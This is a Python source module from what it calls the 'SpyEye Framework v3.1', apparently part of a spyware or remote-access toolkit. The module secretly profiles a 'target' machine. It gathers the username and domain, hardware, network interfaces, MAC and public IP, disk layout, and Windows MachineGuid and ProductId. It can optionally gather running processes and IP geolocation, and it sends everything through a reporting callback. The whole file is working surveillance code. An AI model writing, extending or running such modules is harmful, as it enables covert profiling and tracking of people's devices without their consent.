"""
modules/device_info.py

Professional Device Fingerprinting and Information Gathering Module for SpyEye Framework v3.1.
  - Cross-platform support (Windows, Linux, Android bridges).
  - Gathers OS internals, hardware stats (CPU/RAM/GPU), network topology, storage, and identifiers.
  - Safe error handling with resilient fallbacks for missing optional packages (psutil, wmi, netifaces).
"""

import logging
import os
import platform
import socket
import sys
import time
import uuid as uuid_lib
from typing import Any, Dict, List, Optional

from modules.base import BaseModule

logger = logging.getLogger(__name__)


class DeviceInfoModule(BaseModule):
    """
    Gathers extensive device telemetry and system profile in a single-shot execution.

    Configuration parameters:
        collect_location (bool): Attempt IP/GPS geolocation mapping (default: False)
        collect_installed_apps (bool): Gather active process list or installed apps (default: False)
        platform (str): "windows" | "android" | "linux" (auto-detected if omitted)
    """

    def validate_config(self) -> bool:
        """All configuration fields are optional; validation always passes."""
        return True

    def run(self) -> None:
        """Main execution thread to gather and dispatch device telemetry."""
        try:
            device_profile = self._gather_all()
            self._emit_result(device_profile)
            logger.info("[%s] Full device fingerprinting completed successfully for target %s", self._module_name, self.target_id)
        except Exception as exc:
            logger.exception("[%s] Critical failure during device data collection: %s", self._module_name, exc)
            self._emit_error(f"Device info collection failed: {exc}")

    def _gather_all(self) -> Dict[str, Any]:
        """Aggregate all system inspection sources into a structured dictionary."""
        platform_name = self.config.get("platform", sys.platform).lower()

        profile = {
            "target_id": self.target_id,
            "timestamp": time.time(),
            "collected_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }

        # ─── OS & Kernel Internals ──────────────────────────────────
        profile["os"] = {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "architecture": platform.architecture(),
            "platform_full": platform.platform(),
        }

        # ─── Environment & User Session ─────────────────────────────
        profile["environment"] = {
            "python_version": sys.version,
            "python_executable": sys.executable,
            "cwd": os.getcwd(),
            "username": os.environ.get("USERNAME") or os.environ.get("USER", "unknown"),
            "computer_name": os.environ.get("COMPUTERNAME", platform.node()),
            "user_domain": os.environ.get("USERDOMAIN", ""),
            "temp_dir": os.environ.get("TEMP") or os.environ.get("TMP", "/tmp"),
        }

        # ─── Hardware Architecture ──────────────────────────────────
        profile["hardware"] = self._get_hardware_info(platform_name)

        # ─── Network Interfaces & Topology ──────────────────────────
        profile["network"] = self._get_network_info()

        # ─── Disk Storage & Filesystems ─────────────────────────────
        profile["disk"] = self._get_disk_info()

        # ─── Running Processes (Optional) ───────────────────────────
        if self.config.get("collect_installed_apps", False):
            profile["processes"] = self._get_process_list()

        # ─── Geolocation Mapping (Optional) ─────────────────────────
        if self.config.get("collect_location", False):
            profile["location"] = self._get_location()

        # ─── Unique Hardware Identifiers & UUIDs ────────────────────
        profile["identifiers"] = self._get_identifiers()

        return profile

    def _get_hardware_info(self, platform_name: str) -> Dict[str, Any]:
        """Collect CPU core metrics, RAM status, and GPU controllers."""
        hw: Dict[str, Any] = {
            "cpu_count_logical": os.cpu_count() or 0,
            "cpu_count_physical": 0,
            "ram_total_mb": 0,
            "ram_available_mb": 0,
            "ram_percent_used": 0.0,
            "gpus": [],
        }

        try:
            import psutil
            hw["cpu_count_physical"] = psutil.cpu_count(logical=False) or 0
            mem = psutil.virtual_memory()
            hw["ram_total_mb"] = mem.total // (1024 * 1024)
            hw["ram_available_mb"] = mem.available // (1024 * 1024)
            hw["ram_percent_used"] = round(mem.percent, 1)
        except ImportError:
            logger.warning("[%s] 'psutil' module missing; skipping detailed hardware metrics.", self._module_name)

        # Windows WMI integration for GPU and Motherboard details
        if platform_name.startswith("win"):
            try:
                import wmi
                wmi_obj = wmi.WMI()
                gpu_list = []
                for gpu in wmi_obj.Win32_VideoController():
                    gpu_list.append({
                        "name": getattr(gpu, "Name", "Unknown GPU"),
                        "driver_version": getattr(gpu, "DriverVersion", "N/A"),
                        "ram_mb": (gpu.AdapterRAM // (1024 * 1024)) if getattr(gpu, "AdapterRAM", None) else 0,
                    })
                hw["gpus"] = gpu_list
            except Exception as exc:
                logger.debug("[%s] WMI GPU query failed or unsupported: %s", self._module_name, exc)

        return hw

    def _get_network_info(self) -> Dict[str, Any]:
        """Gather network configurations, IP addresses, MAC IDs, and public routing."""
        net: Dict[str, Any] = {
            "hostname": socket.gethostname(),
            "fqdn": socket.getfqdn(),
            "interfaces": [],
            "public_ip": "",
            "mac_address": "",
        }

        try:
            import netifaces
            interfaces = []
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                iface_data = {"name": iface}
                if netifaces.AF_LINK in addrs:
                    iface_data["mac"] = addrs[netifaces.AF_LINK][0].get("addr", "")
                if netifaces.AF_INET in addrs:
                    iface_data["ipv4"] = addrs[netifaces.AF_INET][0].get("addr", "")
                    iface_data["netmask"] = addrs[netifaces.AF_INET][0].get("netmask", "")
                interfaces.append(iface_data)
            net["interfaces"] = interfaces
        except ImportError:
            # Fallback socket routing check
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                net["primary_ip"] = s.getsockname()[0]
                s.close()
            except Exception:
                net["primary_ip"] = "127.0.0.1"

        # Resolve public IP via external API
        try:
            import requests
            resp = requests.get("https://api.ipify.org?format=json", timeout=4)
            if resp.status_code == 200:
                net["public_ip"] = resp.json().get("ip", "")
        except Exception:
            pass

        # Extract system MAC address
        try:
            mac_node = uuid_lib.getnode()
            if mac_node:
                net["mac_address"] = ":".join(f"{(mac_node >> bits) & 0xff:02x}" for bits in range(0, 48, 8)[::-1])
        except Exception:
            pass

        return net

    def _get_disk_info(self) -> List[Dict[str, Any]]:
        """Enumerate mounted disks and partition storage capacities."""
        disks = []
        try:
            import psutil
            for part in psutil.disk_partitions(all=False):
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    disks.append({
                        "device": part.device,
                        "mountpoint": part.mountpoint,
                        "fstype": part.fstype,
                        "total_gb": round(usage.total / (1024**3), 2),
                        "used_gb": round(usage.used / (1024**3), 2),
                        "free_gb": round(usage.free / (1024**3), 2),
                        "percent_used": usage.percent,
                    })
                except Exception:
                    continue
        except ImportError:
            pass
        return disks

    def _get_process_list(self) -> List[Dict[str, Any]]:
        """List active system processes ordered by CPU usage."""
        try:
            import psutil
            processes = []
            for proc in sorted(
                psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent", "exe"]),
                key=lambda p: p.info.get("cpu_percent", 0) or 0,
                reverse=True
            )[:40]:
                try:
                    processes.append({
                        "pid": proc.info["pid"],
                        "name": proc.info["name"],
                        "cpu": proc.info["cpu_percent"],
                        "memory": proc.info["memory_percent"],
                        "path": proc.info["exe"],
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return processes
        except ImportError:
            return []

    def _get_location(self) -> Dict[str, Any]:
        """Perform approximate geolocation tracking via IP analysis."""
        try:
            import requests
            resp = requests.get("https://ipapi.co/json/", timeout=6)
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass
        return {"error": "Geolocation service unreachable"}

    def _get_identifiers(self) -> Dict[str, str]:
        """Extract platform-specific unique machine GUIDs and product IDs."""
        ids: Dict[str, str] = {
            "machine_guid": "",
            "product_id": "",
            "product_uuid": "",
        }

        if sys.platform.startswith("win"):
            try:
                import winreg
                # Windows Machine GUID
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
                    ids["machine_guid"] = winreg.QueryValueEx(key, "MachineGuid")[0]
            except Exception:
                pass

            try:
                import winreg
                # Windows Product Version ID
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
                    ids["product_id"] = winreg.QueryValueEx(key, "ProductId")[0]
            except Exception:
                pass

        elif sys.platform.startswith("linux"):
            try:
                with open("/sys/class/dmi/id/product_uuid", "r") as f:
                    ids["product_uuid"] = f.read().strip()
            except Exception:
                pass

        return ids

    def _emit_result(self, data: Dict[str, Any]) -> None:
        """Dispatch collected fingerprint telemetry through the callback channel."""
        payload = {
            "target_id": self.target_id,
            "module": "device_info",
            "action": "result",
            "data": data,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.info("[%s] Fingerprint telemetry gathered successfully (%d keys)", self._module_name, len(data))

    def _emit_error(self, message: str) -> None:
        """Dispatch error notifications."""
        payload = {
            "target_id": self.target_id,
            "module": "device_info",
            "action": "error",
            "message": message,
            "timestamp": time.time(),
        }
        if self._result_callback:
            self._result_callback(payload)
        else:
            logger.error("[%s] Error: %s", self._module_name, message)

    def set_result_callback(self, callback) -> None:
        """Inject result reporting callback function."""
        self._result_callback = callback